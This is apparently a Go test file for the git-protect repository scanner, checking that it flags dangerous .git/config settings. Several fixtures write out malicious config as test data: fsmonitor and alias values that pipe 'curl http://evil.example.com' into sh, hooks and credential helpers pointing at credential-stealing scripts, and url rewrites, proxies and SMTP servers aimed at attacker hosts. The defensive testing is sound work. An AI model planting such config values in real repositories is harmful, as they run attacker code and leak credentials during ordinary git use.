package scanner_test

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

// configScan is a shortcut used throughout config tests.
func configScan(t *testing.T, repo string) []scanner.Finding {
	t.Helper()
	m := scanner.NewConfigModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("config scan error: %v", err)
	}
	return findings
}

func TestConfigScanner_CleanConfig(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/legit/project.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
`)
	assertNoFindings(t, configScan(t, repo))
}

func TestConfigScanner_FsmonitorAttack(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
	fsmonitor = "curl http://evil.example.com/c.sh | sh"
`)
	findings := configScan(t, repo)
	if len(findings) < 1 {
		t.Fatalf("expected at least 1 finding, got 0")
	}
	assertFinding(t, findings, "config", "core.fsmonitor")
	assertSeverity(t, findings, "core.fsmonitor", scanner.Critical)
}

func TestConfigScanner_CorePager(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	pager = "less | /tmp/attack"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.pager")
}

func TestConfigScanner_CoreEditor(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	editor = "/tmp/evil-editor"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.editor")
}

func TestConfigScanner_CoreSshCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	sshCommand = "ssh -o ProxyCommand=/tmp/evil"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.sshCommand")
}

func TestConfigScanner_CoreAskPass(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	askPass = /tmp/steal-creds.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.askPass")
}

func TestConfigScanner_CoreHooksPath(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	hooksPath = /tmp/attacker-hooks
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.hooksPath")
}

func TestConfigScanner_CoreGitProxy(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	gitProxy = /tmp/proxy-cmd
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.gitProxy")
}

func TestConfigScanner_CoreAlternateRefsCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	alternateRefsCommand = /tmp/alt-cmd
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.alternateRefsCommand")
}

func TestConfigScanner_CredentialHelper(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[credential]
	helper = /tmp/steal-token.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "credential.helper")
}

func TestConfigScanner_DiffTextconv(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[diff "malicious"]
	textconv = /tmp/exfil
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "diff.malicious.textconv")
}

func TestConfigScanner_DiffExternal(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[diff]
	external = /tmp/diff-wrapper
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "diff.external")
}

func TestConfigScanner_DifftoolCmd(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[difftool "evil"]
	cmd = /tmp/difftool-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "difftool.evil.cmd")
}

func TestConfigScanner_MergeTool(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[merge]
	tool = evilmerge
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "merge.tool")
}

func TestConfigScanner_MergetoolCmd(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[mergetool "evil"]
	cmd = /tmp/mergetool-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "mergetool.evil.cmd")
}

func TestConfigScanner_FilterSmudge(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[filter "build"]
	smudge = /tmp/inject.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "filter.build.smudge")
}

func TestConfigScanner_FilterClean(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[filter "build"]
	clean = /tmp/exfil.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "filter.build.clean")
}

func TestConfigScanner_FilterProcess(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[filter "build"]
	process = /tmp/persistent-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "filter.build.process")
}

func TestConfigScanner_AliasWithBang(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[alias]
	evil = "!curl http://evil.example.com | sh"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "alias.evil")
}

func TestConfigScanner_AliasWithoutBang_NoFinding(t *testing.T) {
	repo := makeRepo(t)
	// Normal git-command aliases are safe.
	writeGitConfig(t, repo, `[alias]
	st = status
	co = checkout
	lg = "log --oneline --graph"
`)
	assertNoFindings(t, configScan(t, repo))
}

func TestConfigScanner_GpgProgram(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[gpg]
	program = /tmp/fake-gpg
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "gpg.program")
}

func TestConfigScanner_GpgSubkeyProgram(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[gpg "x509"]
	program = /tmp/fake-x509
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "gpg.x509.program")
}

func TestConfigScanner_GpgSshDefaultKeyCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[gpg "ssh"]
	defaultKeyCommand = /tmp/key-exfil
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "gpg.ssh.defaultKeyCommand")
}

func TestConfigScanner_SequenceEditor(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[sequence]
	editor = /tmp/rebase-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "sequence.editor")
}

func TestConfigScanner_TrailerCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[trailer "ticket"]
	command = /tmp/trailer-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "trailer.ticket.command")
}

func TestConfigScanner_TrailerCmd(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[trailer "ticket"]
	cmd = /tmp/trailer-attack-v2
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "trailer.ticket.cmd")
}

func TestConfigScanner_RemoteUploadpack(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[remote "origin"]
	url = https://github.com/legit/repo.git
	uploadpack = /tmp/fake-upload-pack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "remote.origin.uploadpack")
}

func TestConfigScanner_RemoteReceivepack(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[remote "origin"]
	url = https://github.com/legit/repo.git
	receivepack = /tmp/fake-receive-pack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "remote.origin.receivepack")
}

func TestConfigScanner_UrlInsteadOf(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[url "https://evil.example.com/"]
	insteadOf = https://github.com/
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "insteadOf")
}

func TestConfigScanner_HttpSslCAInfo(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[http]
	sslCAInfo = /tmp/evil-ca.crt
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "http.sslCAInfo")
}

func TestConfigScanner_HttpSslVerifyFalse(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[http]
	sslVerify = false
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "http.sslVerify")
}

func TestConfigScanner_HttpSslVerifyTrue_NoFinding(t *testing.T) {
	repo := makeRepo(t)
	// sslVerify = true is the default safe value.
	writeGitConfig(t, repo, `[http]
	sslVerify = true
`)
	assertNoFindings(t, configScan(t, repo))
}

func TestConfigScanner_HttpProxy(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[http]
	proxy = http://attacker.example.com:8080
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "http.proxy")
}

func TestConfigScanner_SendemailSmtpServer(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[sendemail]
	smtpserver = attacker.example.com
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "sendemail.smtpserver")
}

func TestConfigScanner_MultipleKeys_AllReported(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	fsmonitor = "curl http://evil.example.com | sh"
	hooksPath = /tmp/attacker-hooks
[filter "attack"]
	smudge = /tmp/inject.sh
[alias]
	evil = "!curl http://evil.example.com | sh"
	st   = status
[url "https://evil.example.com/"]
	insteadOf = https://github.com/
`)
	findings := configScan(t, repo)
	if len(findings) < 5 {
		t.Errorf("expected at least 5 findings, got %d: %v", len(findings), findings)
	}
	assertFinding(t, findings, "config", "core.fsmonitor")
	assertFinding(t, findings, "config", "core.hooksPath")
	assertFinding(t, findings, "config", "alias.evil")
}

func TestConfigScanner_MissingConfigFile_NoError(t *testing.T) {
	repo := makeRepo(t)
	// No .git/config written – scanner must return cleanly.
	m := scanner.NewConfigModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("scanner must not error on missing config, got: %v", err)
	}
	_ = findings
}

func TestConfigScanner_ConfigPath(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	fsmonitor = /tmp/attack
`)
	findings := configScan(t, repo)
	if len(findings) == 0 {
		t.Fatal("expected findings")
	}
	if !strings.Contains(findings[0].Path, filepath.Join(".git", "config")) {
		t.Errorf("path %q should contain .git/config", findings[0].Path)
	}
}
